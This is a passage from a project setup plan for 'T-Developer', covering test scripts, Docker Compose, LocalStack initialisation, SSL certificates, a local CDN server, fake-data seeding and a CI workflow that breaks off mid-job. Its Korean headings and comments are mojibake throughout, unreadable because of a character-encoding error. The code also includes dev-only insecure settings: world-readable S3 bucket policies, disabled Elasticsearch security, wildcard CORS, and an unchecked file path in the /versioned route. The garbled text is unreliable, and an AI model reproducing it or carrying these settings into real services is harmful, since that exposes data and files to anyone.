**ëª©í‘œ**: ë‹¤ì–‘í•œ í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤ ì‹¤í–‰ ìŠ¤í¬ë¦½íŠ¸

**êµ¬í˜„ ë‚´ìš©**:
```json
// backend/package.json (scripts ì„¹ì…˜ ì¶”ê°€)
{
  "scripts": {
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:unit": "jest --testPathPattern=unit",
    "test:integration": "jest --testPathPattern=integration",
    "test:e2e": "jest --testPathPattern=e2e --runInBand",
    "test:e2e:setup": "ts-node tests/e2e/setup.ts",
    "test:seed": "ts-node tests/fixtures/seed-data.ts",
    "test:all": "npm run test:unit && npm run test:integration && npm run test:e2e"
  }
}
```

```bash
#!/bin/bash
# scripts/run-tests.sh

#!/bin/bash
set -e

echo "ğŸ§ª T-Developer í…ŒìŠ¤íŠ¸ ì‹¤í–‰"
echo "=========================="

# í™˜ê²½ ë³€ìˆ˜ ì„¤ì •
export NODE_ENV=test
export AWS_REGION=us-east-1
export DYNAMODB_ENDPOINT=http://localhost:8000

# í…ŒìŠ¤íŠ¸ íƒ€ì… ì„ íƒ
if [ "$1" == "unit" ]; then
    echo "ğŸ”¬ ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ ì‹¤í–‰..."
    npm run test:unit
elif [ "$1" == "integration" ]; then
    echo "ğŸ”— í†µí•© í…ŒìŠ¤íŠ¸ ì‹¤í–‰..."
    npm run test:integration
elif [ "$1" == "e2e" ]; then
    echo "ğŸŒ E2E í…ŒìŠ¤íŠ¸ ì‹¤í–‰..."
    npm run test:e2e:setup
    npm run test:e2e
elif [ "$1" == "all" ]; then
    echo "ğŸ“Š ì „ì²´ í…ŒìŠ¤íŠ¸ ì‹¤í–‰..."
    npm run test:all
else
    echo "ì‚¬ìš©ë²•: ./run-tests.sh [unit|integration|e2e|all]"
    exit 1
fi

echo "âœ… í…ŒìŠ¤íŠ¸ ì™„ë£Œ!"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- í…ŒìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê¶Œí•œ: `chmod +x scripts/run-tests.sh`
- ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ ì‹¤í–‰: `./scripts/run-tests.sh unit`
- ì „ì²´ í…ŒìŠ¤íŠ¸ ì‹¤í–‰: `./scripts/run-tests.sh all`

---

### SubTask 0.5.6: í…ŒìŠ¤íŠ¸ ë³´ê³ ì„œ ìƒì„± ì„¤ì •
**ëª©í‘œ**: í…ŒìŠ¤íŠ¸ ê²°ê³¼ë¥¼ ì‹œê°ì ìœ¼ë¡œ ë³´ì—¬ì£¼ëŠ” ë¦¬í¬íŠ¸ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/jest-html-reporter.config.js
module.exports = {
  pageTitle: 'T-Developer Test Report',
  outputPath: 'test-reports/index.html',
  includeFailureMsg: true,
  includeConsoleLog: true,
  dateFormat: 'yyyy-mm-dd HH:MM:ss',
  theme: 'darkTheme',
  logo: './assets/logo.png',
  customCss: './test-reports/custom.css',
  executionTimeWarningThreshold: 5000,
  
  // ì»¤ìŠ¤í…€ ì •ë³´ ì¶”ê°€
  customInfos: [
    {label: 'Environment', value: process.env.NODE_ENV || 'test'},
    {label: 'Node Version', value: process.version},
    {label: 'Test Runner', value: 'Jest'}
  ]
};
```

```typescript
// backend/src/utils/test-reporter.ts
import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';

export class CustomTestReporter {
  private results: any[] = [];
  
  onRunStart() {
    this.results = [];
    console.log('ğŸ§ª í…ŒìŠ¤íŠ¸ ì‹¤í–‰ ì‹œì‘...');
  }
  
  onTestResult(test: any, testResult: any) {
    this.results.push({
      testPath: test.path,
      duration: testResult.perfStats.runtime,
      passed: testResult.numFailingTests === 0,
      coverage: testResult.coverage
    });
  }
  
  onRunComplete(contexts: any, results: any) {
    const report = {
      startTime: results.startTime,
      endTime: Date.now(),
      duration: Date.now() - results.startTime,
      numTotalTests: results.numTotalTests,
      numPassedTests: results.numPassedTests,
      numFailedTests: results.numFailedTests,
      numPendingTests: results.numPendingTests,
      testResults: this.results,
      coverage: results.coverageMap
    };
    
    // ë¦¬í¬íŠ¸ ë””ë ‰í† ë¦¬ ìƒì„±
    const reportDir = join(process.cwd(), 'test-reports');
    mkdirSync(reportDir, { recursive: true });
    
    // JSON ë¦¬í¬íŠ¸ ì €ì¥
    writeFileSync(
      join(reportDir, 'test-results.json'),
      JSON.stringify(report, null, 2)
    );
    
    // ê°„ë‹¨í•œ ìš”ì•½ ì¶œë ¥
    console.log('\nğŸ“Š í…ŒìŠ¤íŠ¸ ê²°ê³¼ ìš”ì•½:');
    console.log(`âœ… ì„±ê³µ: ${results.numPassedTests}`);
    console.log(`âŒ ì‹¤íŒ¨: ${results.numFailedTests}`);
    console.log(`â­ï¸  ìŠ¤í‚µ: ${results.numPendingTests}`);
    console.log(`â±ï¸  ì‹œê°„: ${(report.duration / 1000).toFixed(2)}ì´ˆ`);
  }
}
```

---

## Task 0.6: ë¡œì»¬ ê°œë°œ ì¸í”„ë¼ êµ¬ì„±

### SubTask 0.6.1: Docker Compose ì „ì²´ ì„¤ì •
**ëª©í‘œ**: ì™„ì „í•œ ë¡œì»¬ ê°œë°œ í™˜ê²½ì„ ìœ„í•œ Docker êµ¬ì„±

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# docker-compose.yml
version: '3.8'

services:
  # DynamoDB Local
  dynamodb:
    image: amazon/dynamodb-local:latest
    container_name: t-developer-dynamodb
    ports:
      - "8000:8000"
    command: "-jar DynamoDBLocal.jar -sharedDb -inMemory"
    networks:
      - t-developer-network

  # Redis
  redis:
    image: redis:7-alpine
    container_name: t-developer-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:-devpassword}
    volumes:
      - redis-data:/data
    networks:
      - t-developer-network

  # LocalStack (AWS ì„œë¹„ìŠ¤ ëª¨í‚¹)
  localstack:
    image: localstack/localstack:latest
    container_name: t-developer-localstack
    ports:
      - "4566:4566"
      - "4571:4571"
    environment:
      - SERVICES=s3,lambda,secretsmanager,cloudwatch
      - DEBUG=1
      - LAMBDA_EXECUTOR=docker
      - DOCKER_HOST=unix:///var/run/docker.sock
    volumes:
      - "/var/run/docker.sock:/var/run/docker.sock"
      - localstack-data:/tmp/localstack
    networks:
      - t-developer-network

  # Postgres (ì„ íƒì  - DynamoDB ëŒ€ì‹  ì‚¬ìš© ê°€ëŠ¥)
  postgres:
    image: postgres:15-alpine
    container_name: t-developer-postgres
    ports:
      - "5432:5432"
    environment:
      POSTGRES_DB: t_developer
      POSTGRES_USER: ${DB_USER:-developer}
      POSTGRES_PASSWORD: ${DB_PASSWORD:-devpassword}
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - t-developer-network

  # Elasticsearch (ì»´í¬ë„ŒíŠ¸ ê²€ìƒ‰ìš©)
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    container_name: t-developer-elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    networks:
      - t-developer-network

  # Kibana (Elasticsearch UI)
  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    container_name: t-developer-kibana
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch
    networks:
      - t-developer-network

  # Jaeger (ë¶„ì‚° ì¶”ì )
  jaeger:
    image: jaegertracing/all-in-one:latest
    container_name: t-developer-jaeger
    ports:
      - "16686:16686"
      - "14268:14268"
    environment:
      - COLLECTOR_ZIPKIN_HOST_PORT=:9411
    networks:
      - t-developer-network

volumes:
  redis-data:
  localstack-data:
  postgres-data:
  elasticsearch-data:

networks:
  t-developer-network:
    driver: bridge
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- Docker Desktop ë©”ëª¨ë¦¬ í• ë‹¹ í™•ì¸ (ìµœì†Œ 4GB)
- `docker-compose up -d` ì‹¤í–‰
- ëª¨ë“  ì„œë¹„ìŠ¤ health check í™•ì¸

### SubTask 0.6.2: LocalStack AWS ì„œë¹„ìŠ¤ ì´ˆê¸°í™”
**ëª©í‘œ**: LocalStackì—ì„œ í•„ìš”í•œ AWS ì„œë¹„ìŠ¤ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```python
# scripts/setup-localstack.py
import boto3
import json
import time
from botocore.config import Config

# LocalStack ì„¤ì •
config = Config(
    region_name='us-east-1',
    retries={'max_attempts': 10, 'mode': 'standard'}
)

# LocalStack ì—”ë“œí¬ì¸íŠ¸
LOCALSTACK_URL = 'http://localhost:4566'

def create_s3_buckets():
    """S3 ë²„í‚· ìƒì„±"""
    s3 = boto3.client('s3', endpoint_url=LOCALSTACK_URL, config=config)
    
    buckets = [
        't-developer-artifacts',
        't-developer-components',
        't-developer-templates',
        't-developer-test-data'
    ]
    
    for bucket in buckets:
        try:
            s3.create_bucket(Bucket=bucket)
            print(f"âœ… S3 ë²„í‚· ìƒì„±: {bucket}")
            
            # ë²„í‚· ì •ì±… ì„¤ì •
            bucket_policy = {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": "*",
                    "Action": "s3:GetObject",
                    "Resource": f"arn:aws:s3:::{bucket}/*"
                }]
            }
            s3.put_bucket_policy(
                Bucket=bucket,
                Policy=json.dumps(bucket_policy)
            )
        except Exception as e:
            print(f"âš ï¸  ë²„í‚· ìƒì„± ì‹¤íŒ¨ {bucket}: {e}")

def create_lambda_functions():
    """Lambda í•¨ìˆ˜ ìŠ¤í… ìƒì„±"""
    lambda_client = boto3.client('lambda', endpoint_url=LOCALSTACK_URL, config=config)
    
    functions = [
        {
            'FunctionName': 't-developer-nl-processor',
            'Runtime': 'nodejs18.x',
            'Role': 'arn:aws:iam::123456789012:role/lambda-role',
            'Handler': 'index.handler',
            'Code': {'ZipFile': b'exports.handler = async (event) => { return { statusCode: 200, body: "OK" }; };'},
            'Timeout': 300,
            'MemorySize': 512
        }
    ]
    
    for func in functions:
        try:
            lambda_client.create_function(**func)
            print(f"âœ… Lambda í•¨ìˆ˜ ìƒì„±: {func['FunctionName']}")
        except Exception as e:
            print(f"âš ï¸  Lambda ìƒì„± ì‹¤íŒ¨: {e}")

def create_secrets():
    """Secrets Manager ì‹œí¬ë¦¿ ìƒì„±"""
    sm = boto3.client('secretsmanager', endpoint_url=LOCALSTACK_URL, config=config)
    
    secrets = {
        't-developer/dev/api-keys': {
            'OPENAI_API_KEY': 'sk-test-xxx',
            'ANTHROPIC_API_KEY': 'sk-ant-test-xxx'
        },
        't-developer/dev/database': {
            'DB_HOST': 'localhost',
            'DB_PORT': '5432',
            'DB_NAME': 't_developer',
            'DB_USER': 'developer',
            'DB_PASSWORD': 'devpassword'
        }
    }
    
    for secret_name, secret_value in secrets.items():
        try:
            sm.create_secret(
                Name=secret_name,
                SecretString=json.dumps(secret_value)
            )
            print(f"âœ… Secret ìƒì„±: {secret_name}")
        except Exception as e:
            print(f"âš ï¸  Secret ìƒì„± ì‹¤íŒ¨: {e}")

def setup_cloudwatch():
    """CloudWatch ë¡œê·¸ ê·¸ë£¹ ìƒì„±"""
    logs = boto3.client('logs', endpoint_url=LOCALSTACK_URL, config=config)
    
    log_groups = [
        '/aws/lambda/t-developer-agents',
        '/aws/ecs/t-developer-api',
        '/t-developer/application'
    ]
    
    for log_group in log_groups:
        try:
            logs.create_log_group(logGroupName=log_group)
            print(f"âœ… ë¡œê·¸ ê·¸ë£¹ ìƒì„±: {log_group}")
        except Exception as e:
            print(f"âš ï¸  ë¡œê·¸ ê·¸ë£¹ ìƒì„± ì‹¤íŒ¨: {e}")

def main():
    print("ğŸš€ LocalStack ì´ˆê¸°í™” ì‹œì‘...")
    
    # LocalStackì´ ì¤€ë¹„ë  ë•Œê¹Œì§€ ëŒ€ê¸°
    time.sleep(5)
    
    create_s3_buckets()
    create_lambda_functions()
    create_secrets()
    setup_cloudwatch()
    
    print("\nâœ… LocalStack ì´ˆê¸°í™” ì™„ë£Œ!")
    print("ğŸ“‹ ì‚¬ìš© ê°€ëŠ¥í•œ ì„œë¹„ìŠ¤:")
    print("- S3: http://localhost:4566")
    print("- Lambda: http://localhost:4566")
    print("- Secrets Manager: http://localhost:4566")
    print("- CloudWatch: http://localhost:4566")

if __name__ == "__main__":
    main()
```

### SubTask 0.6.3: ê°œë°œìš© SSL ì¸ì¦ì„œ ìƒì„±
**ëª©í‘œ**: HTTPS ë¡œì»¬ ê°œë°œì„ ìœ„í•œ ìì²´ ì„œëª… ì¸ì¦ì„œ

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# scripts/generate-ssl-certs.sh

CERT_DIR="./certs"
DOMAIN="localhost"

# ì¸ì¦ì„œ ë””ë ‰í† ë¦¬ ìƒì„±
mkdir -p $CERT_DIR

# Root CA ìƒì„±
openssl genrsa -out $CERT_DIR/rootCA.key 2048
openssl req -x509 -new -nodes -key $CERT_DIR/rootCA.key -sha256 -days 365 \
    -out $CERT_DIR/rootCA.crt \
    -subj "/C=US/ST=State/L=City/O=T-Developer/CN=T-Developer Root CA"

# ì„œë²„ í‚¤ ìƒì„±
openssl genrsa -out $CERT_DIR/server.key 2048

# ì¸ì¦ì„œ ìš”ì²­ ìƒì„±
openssl req -new -key $CERT_DIR/server.key -out $CERT_DIR/server.csr \
    -subj "/C=US/ST=State/L=City/O=T-Developer/CN=$DOMAIN"

# SAN ì„¤ì • íŒŒì¼ ìƒì„±
cat > $CERT_DIR/server.conf <<EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req

[req_distinguished_name]

[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = localhost
DNS.2 = *.localhost
IP.1 = 127.0.0.1
IP.2 = ::1
EOF

# ì„œë²„ ì¸ì¦ì„œ ìƒì„±
openssl x509 -req -in $CERT_DIR/server.csr -CA $CERT_DIR/rootCA.crt \
    -CAkey $CERT_DIR/rootCA.key -CAcreateserial \
    -out $CERT_DIR/server.crt -days 365 -sha256 \
    -extfile $CERT_DIR/server.conf -extensions v3_req

# PEM í˜•ì‹ìœ¼ë¡œ ë³€í™˜
cat $CERT_DIR/server.crt $CERT_DIR/server.key > $CERT_DIR/server.pem

echo "âœ… SSL ì¸ì¦ì„œ ìƒì„± ì™„ë£Œ!"
echo "ğŸ“ ì¸ì¦ì„œ ìœ„ì¹˜: $CERT_DIR/"
echo "ğŸ” Root CAë¥¼ ì‹œìŠ¤í…œì— ì‹ ë¢°í•  ì¸ì¦ì„œë¡œ ì¶”ê°€í•˜ì„¸ìš”:"
echo "   - macOS: sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain $CERT_DIR/rootCA.crt"
echo "   - Ubuntu: sudo cp $CERT_DIR/rootCA.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates"
```

```typescript
// backend/src/config/https-server.ts
import https from 'https';
import fs from 'fs';
import path from 'path';
import express from 'express';

export function createHttpsServer(app: express.Application) {
  const certPath = path.join(process.cwd(), 'certs');
  
  const options = {
    key: fs.readFileSync(path.join(certPath, 'server.key')),
    cert: fs.readFileSync(path.join(certPath, 'server.crt'))
  };
  
  return https.createServer(options, app);
}

// ê°œë°œ í™˜ê²½ì—ì„œ HTTPS ì‚¬ìš©
if (process.env.NODE_ENV === 'development' && process.env.USE_HTTPS === 'true') {
  const httpsServer = createHttpsServer(app);
  httpsServer.listen(443, () => {
    console.log('ğŸ”’ HTTPS Server running on https://localhost');
  });
}
```

### SubTask 0.6.4: ë¡œì»¬ CDN ì‹œë®¬ë ˆì´ì…˜
**ëª©í‘œ**: ì •ì  íŒŒì¼ ì„œë¹™ì„ ìœ„í•œ ë¡œì»¬ CDN í™˜ê²½

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/services/local-cdn.ts
import express from 'express';
import path from 'path';
import { createHash } from 'crypto';
import { promises as fs } from 'fs';

export class LocalCDN {
  private app: express.Application;
  private cache: Map<string, Buffer> = new Map();
  
  constructor() {
    this.app = express();
    this.setupRoutes();
  }
  
  private setupRoutes() {
    // ì •ì  íŒŒì¼ ì„œë¹™
    this.app.use('/static', express.static(path.join(process.cwd(), 'public'), {
      maxAge: '1y',
      etag: true,
      lastModified: true,
      setHeaders: (res, filepath) => {
        // íŒŒì¼ íƒ€ì…ë³„ ìºì‹œ ì„¤ì •
        if (filepath.endsWith('.js') || filepath.endsWith('.css')) {
          res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        } else if (filepath.endsWith('.html')) {
          res.setHeader('Cache-Control', 'no-cache');
        }
        
        // CORS í—¤ë”
        res.setHeader('Access-Control-Allow-Origin', '*');
      }
    }));
    
    // ì´ë¯¸ì§€ ìµœì í™”
    this.app.get('/images/:size/:filename', async (req, res) => {
      const { size, filename } = req.params;
      const cacheKey = `${size}-${filename}`;
      
      // ìºì‹œ í™•ì¸
      if (this.cache.has(cacheKey)) {
        res.setHeader('X-Cache', 'HIT');
        return res.send(this.cache.get(cacheKey));
      }
      
      // ì´ë¯¸ì§€ ë¦¬ì‚¬ì´ì§• (sharp ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©)
      try {
        const originalPath = path.join(process.cwd(), 'public/images', filename);
        const [width, height] = size.split('x').map(Number);
        
        // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” sharpë¥¼ ì‚¬ìš©í•˜ì—¬ ë¦¬ì‚¬ì´ì§•
        // const resized = await sharp(originalPath).resize(width, height).toBuffer();
        
        res.setHeader('X-Cache', 'MISS');
        res.sendFile(originalPath); // ì„ì‹œë¡œ ì›ë³¸ ì „ì†¡
      } catch (error) {
        res.status(404).send('Image not found');
      }
    });
    
    // íŒŒì¼ ë²„ì „ ê´€ë¦¬
    this.app.get('/versioned/*', async (req, res) => {
      const filepath = req.params[0];
      const fullPath = path.join(process.cwd(), 'public', filepath);
      
      try {
        const content = await fs.readFile(fullPath);
        const hash = createHash('md5').update(content).digest('hex').substr(0, 8);
        
        res.setHeader('ETag', `"${hash}"`);
        res.setHeader('Cache-Control', 'public, max-age=31536000');
        
        res.send(content);
      } catch (error) {
        res.status(404).send('File not found');
      }
    });
  }
  
  start(port: number = 3002) {
    this.app.listen(port, () => {
      console.log(`ğŸŒ Local CDN running on http://localhost:${port}`);
    });
  }
}
```

```nginx
# nginx/nginx.conf (ë¡œì»¬ CDNìš©)
worker_processes auto;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    # ìºì‹± ì„¤ì •
    proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=cdn_cache:10m max_size=1g inactive=60m;
    
    # Gzip ì••ì¶•
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/xml text/javascript application/json application/javascript application/xml+rss;
    
    server {
        listen 80;
        server_name cdn.localhost;
        
        location / {
            proxy_pass http://localhost:3002;
            proxy_cache cdn_cache;
            proxy_cache_valid 200 302 1d;
            proxy_cache_valid 404 1m;
            
            add_header X-Cache-Status $upstream_cache_status;
            add_header Cache-Control "public, max-age=31536000";
        }
        
        location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
            expires 1y;
            add_header Cache-Control "public, immutable";
        }
    }
}
```

### SubTask 0.6.5: ê°œë°œ ë°ì´í„° ìƒì„±ê¸°
**ëª©í‘œ**: í˜„ì‹¤ì ì¸ í…ŒìŠ¤íŠ¸ ë°ì´í„° ìë™ ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/utils/data-generator.ts
import { faker } from '@faker-js/faker';
import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';

export class DevelopmentDataGenerator {
  constructor(private docClient: DynamoDBDocumentClient) {}
  
  async generateProjects(count: number = 50): Promise<void> {
    const projects = [];
    
    for (let i = 0; i < count; i++) {
      const project = {
        id: `proj_${faker.string.uuid()}`,
        userId: `user_${faker.string.uuid()}`,
        name: this.generateProjectName(),
        description: this.generateProjectDescription(),
        projectType: faker.helpers.arrayElement(['web', 'api', 'mobile', 'desktop', 'cli']),
        status: this.generateWeightedStatus(),
        createdAt: faker.date.past({ years: 1 }).toISOString(),
        updatedAt: faker.date.recent({ days: 30 }).toISOString(),
        
        // ê¸°ìˆ  ìŠ¤íƒ
        techStack: {
          frontend: faker.helpers.arrayElement(['react', 'vue', 'angular', 'svelte', null]),
          backend: faker.helpers.arrayElement(['node', 'python', 'java', 'go', null]),
          database: faker.helpers.arrayElement(['postgres', 'mysql', 'mongodb', 'dynamodb']),
          cloud: faker.helpers.arrayElement(['aws', 'gcp', 'azure', 'vercel'])
        },
        
        // ì—ì´ì „íŠ¸ ì‹¤í–‰ ê¸°ë¡
        agentExecutions: this.generateAgentExecutions(),
        
        // ì„±ëŠ¥ ë©”íŠ¸ë¦­
        metrics: {
          buildTime: faker.number.int({ min: 30, max: 600 }),
          totalCost: faker.number.float({ min: 0.01, max: 10.00, precision: 0.01 }),
          componentsUsed: faker.number.int({ min: 5, max: 50 }),
          linesOfCode: faker.number.int({ min: 1000, max: 50000 })
        }
      };
      
      projects.push(project);
    }
    
    // ë°°ì¹˜ë¡œ ì €ì¥
    for (const project of projects) {
      await this.docClient.send(new PutCommand({
        TableName: 'T-Developer-Projects',
        Item: project
      }));
    }
    
    console.log(`âœ… ${count}ê°œì˜ í”„ë¡œì íŠ¸ ë°ì´í„° ìƒì„± ì™„ë£Œ`);
  }
  
  private generateProjectName(): string {
    const templates = [
      () => `${faker.commerce.productAdjective()} ${faker.hacker.noun()} Platform`,
      () => `${faker.company.buzzNoun()} Management System`,
      () => `${faker.hacker.adjective()} ${faker.hacker.noun()} API`,
      () => `${faker.commerce.product()} Tracker`,
      () => `${faker.company.buzzAdjective()} Analytics Dashboard`
    ];
    
    return faker.helpers.arrayElement(templates)();
  }
  
  private generateProjectDescription(): string {
    const intros = [
      'A modern web application that',
      'An innovative platform designed to',
      'A comprehensive solution for',
      'A cutting-edge system that'
    ];
    
    const actions = [
      'streamlines business processes',
      'enhances user engagement',
      'automates workflow management',
      'provides real-time analytics',
      'optimizes resource allocation'
    ];
    
    const benefits = [
      'increasing productivity by up to 40%',
      'reducing operational costs',
      'improving customer satisfaction',
      'enabling data-driven decisions',
      'facilitating team collaboration'
    ];
    
    return `${faker.helpers.arrayElement(intros)} ${faker.helpers.arrayElement(actions)}, ${faker.helpers.arrayElement(benefits)}.`;
  }
  
  private generateWeightedStatus(): string {
    // ê°€ì¤‘ì¹˜ë¥¼ ë‘” ìƒíƒœ ìƒì„± (ë” í˜„ì‹¤ì ì¸ ë¶„í¬)
    const weights = {
      'completed': 0.6,
      'building': 0.2,
      'testing': 0.1,
      'analyzing': 0.05,
      'error': 0.05
    };
    
    const random = Math.random();
    let cumulative = 0;
    
    for (const [status, weight] of Object.entries(weights)) {
      cumulative += weight;
      if (random < cumulative) {
        return status;
      }
    }
    
    return 'completed';
  }
  
  private generateAgentExecutions(): any[] {
    const agents = [
      'nl-input', 'ui-selection', 'parsing', 'component-decision',
      'matching-rate', 'search', 'generation', 'assembly', 'download'
    ];
    
    return agents.map((agent, index) => ({
      agentName: agent,
      executionTime: faker.number.int({ min: 100, max: 5000 }),
      status: index < 7 ? 'completed' : faker.helpers.arrayElement(['completed', 'running', 'pending']),
      tokensUsed: faker.number.int({ min: 100, max: 10000 })
    }));
  }
  
  async generateComponents(count: number = 200): Promise<void> {
    const components = [];
    
    const componentTypes = {
      'authentication': ['login-form', 'oauth-provider', 'jwt-handler', 'session-manager'],
      'database': ['orm-wrapper', 'query-builder', 'migration-tool', 'connection-pool'],
      'ui': ['data-table', 'chart-library', 'form-builder', 'modal-system'],
      'api': ['rest-client', 'graphql-resolver', 'rate-limiter', 'api-gateway'],
      'utility': ['logger', 'validator', 'error-handler', 'config-manager']
    };
    
    for (let i = 0; i < count; i++) {
      const category = faker.helpers.objectKey(componentTypes);
      const componentName = faker.helpers.arrayElement(componentTypes[category]);
      
      const component = {
        id: `comp_${faker.string.uuid()}`,
        name: `${faker.company.buzzAdjective()}-${componentName}`,
        category,
        version: faker.system.semver(),
        language: faker.helpers.arrayElement(['javascript', 'typescript', 'python', 'java']),
        framework: faker.helpers.arrayElement(['react', 'vue', 'express', 'fastapi', 'spring']),
        
        // í’ˆì§ˆ ë©”íŠ¸ë¦­
        qualityScore: faker.number.float({ min: 3.0, max: 5.0, precision: 0.1 }),
        downloads: faker.number.int({ min: 100, max: 1000000 }),
        stars: faker.number.int({ min: 10, max: 50000 }),
        issues: faker.number.int({ min: 0, max: 100 }),
        
        // ë©”íƒ€ë°ì´í„°
        author: faker.person.fullName(),
        license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0', 'BSD-3-Clause']),
        lastUpdated: faker.date.recent({ days: 90 }).toISOString(),
        description: faker.lorem.sentence(),
        keywords: faker.lorem.words(5).split(' '),
        
        // ì˜ì¡´ì„±
        dependencies: this.generateDependencies(),
        
        // ì‚¬ìš© í†µê³„
        usageStats: {
          projects: faker.number.int({ min: 1, max: 1000 }),
          successRate: faker.number.float({ min: 85, max: 100, precision: 0.1 }),
          avgIntegrationTime: faker.number.int({ min: 5, max: 60 })
        }
      };
      
      components.push(component);
    }
    
    // Elasticsearchì— ì¸ë±ì‹± (ì‹¤ì œ êµ¬í˜„ ì‹œ)
    for (const component of components) {
      await this.docClient.send(new PutCommand({
        TableName: 'T-Developer-Components',
        Item: component
      }));
    }
    
    console.log(`âœ… ${count}ê°œì˜ ì»´í¬ë„ŒíŠ¸ ë°ì´í„° ìƒì„± ì™„ë£Œ`);
  }
  
  private generateDependencies(): Record<string, string> {
    const deps: Record<string, string> = {};
    const count = faker.number.int({ min: 0, max: 10 });
    
    const commonDeps = [
      'lodash', 'axios', 'express', 'react', 'vue',
      'moment', 'uuid', 'bcrypt', 'jsonwebtoken', 'dotenv'
    ];
    
    for (let i = 0; i < count; i++) {
      const dep = faker.helpers.arrayElement(commonDeps);
      deps[dep] = `^${faker.system.semver()}`;
    }
    
    return deps;
  }
}

// ì‹¤í–‰ ìŠ¤í¬ë¦½íŠ¸
export async function seedDevelopmentData() {
  const generator = new DevelopmentDataGenerator(docClient);
  
  console.log('ğŸŒ± ê°œë°œ ë°ì´í„° ìƒì„± ì‹œì‘...');
  
  await Promise.all([
    generator.generateProjects(100),
    generator.generateComponents(500)
  ]);
  
  console.log('âœ… ëª¨ë“  ê°œë°œ ë°ì´í„° ìƒì„± ì™„ë£Œ!');
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- `npm install @faker-js/faker` ì‹¤í–‰
- SSL ì¸ì¦ì„œ ìƒì„±: `./scripts/generate-ssl-certs.sh`
- LocalStack ì´ˆê¸°í™”: `python scripts/setup-localstack.py`
- ê°œë°œ ë°ì´í„° ìƒì„±: `npm run seed:dev`

---

## Task 0.7: CI/CD íŒŒì´í”„ë¼ì¸ ê¸°ì´ˆ ì„¤ì •

### SubTask 0.7.1: GitHub Actions ì›Œí¬í”Œë¡œìš° ì„¤ì •
**ëª©í‘œ**: ìë™í™”ëœ í…ŒìŠ¤íŠ¸ ë° ë¹Œë“œ íŒŒì´í”„ë¼ì¸

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/workflows/ci.yml
name: CI Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

env:
  NODE_VERSION: '18.x'
  PYTHON_VERSION: '3.10'
  AWS_REGION: 'us-east-1'

jobs:
  lint:
    name: Lint Code
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Run ESLint
        run: |
          cd backend
          npm run lint
          
      - name: Run Prettier check
        run: |
          cd backend
          npm run format:check

  test:
    name: Run Tests
    runs-on: ubuntu-latest
    needs: lint
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Run unit tests
        run: |
          cd backend
          npm run test:unit
          
      - name: Run integration tests
        run: |
          cd backend
          npm run test:integration
        env:
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
          
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          directory: ./backend/coverage
          flags: backend
          
  security-scan:
    name: Security Scan
    runs-on: ubuntu-latest
    needs: lint
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
          
      - name: Run npm audit
        run: |
          cd backend
          npm audit --audit-level=high
          
      - name: Run OWASP dependency check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 't-developer'
          path: '.'
          format: 'HTML'
          
  build:
    name: Build Application
    runs-on: ubuntu-latest
    needs: [test, security-scan]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
